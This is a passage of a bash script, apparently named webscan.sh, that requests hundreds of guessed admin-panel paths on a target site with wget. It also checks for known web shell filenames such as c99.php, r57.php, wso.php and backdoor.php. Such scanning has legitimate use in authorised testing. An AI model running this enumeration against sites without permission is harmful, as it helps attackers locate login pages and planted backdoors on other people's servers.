echo "-----------------------------------------------------------------------"
                 
fi
 
d="/user"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/useradmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/UserLogin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/userlogin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/userlogin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/username"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/users.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/users.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/users"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/usr"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/usuario"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/usuarios"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/usuarios/login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/usuarios/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/usuarios/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/usuarios/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/usuarios/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/utility_login"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/uvpanel"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/vadmind"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/vmailadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/vorod.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/vorod.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/vorod"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/vorud.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/vorud.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/vorud"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/WebAdmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/webadmin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/admin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/admin.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/admin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/admin.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/admin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/admin.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/admin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/index.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/index.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/index.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/index.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/index.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/index.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/index.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/login.brfbrf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/webadmin/login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webmaster.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webmaster.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webmaster"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/wizmysqladmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/wp-admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/wp-login"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/wp-login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/wp-login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/wp-login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/wp-login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/wp-login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/xlogin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/yonetici.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/yonetici.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/yonetici.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/yonetim.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/yonetim.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/yonetim.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/ysadmin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/angel.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/c100.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cyberwarrior.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/c99.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/dq99.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/kacak.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/r57.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/privr57.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/GaZa.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/b374k.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/uploadshell.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/file.aspx"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/1n73ction.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/alucar.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/backdoor.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/cw.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/ekinox.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/mysql.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/priv-b374k.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/r00t.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/saudi.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/simattacker.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sosyete.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/syrian.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/webadmin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/x2300.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/zaco.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/shell.aspx"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/shellupload"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/tryag.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/tryag.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/wso.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
cd ..
rm -r ouputcpanel
fi

else
	echo "./webscan.sh: Options Not Found Type ./webscan.sh -h to show Options" 
fi




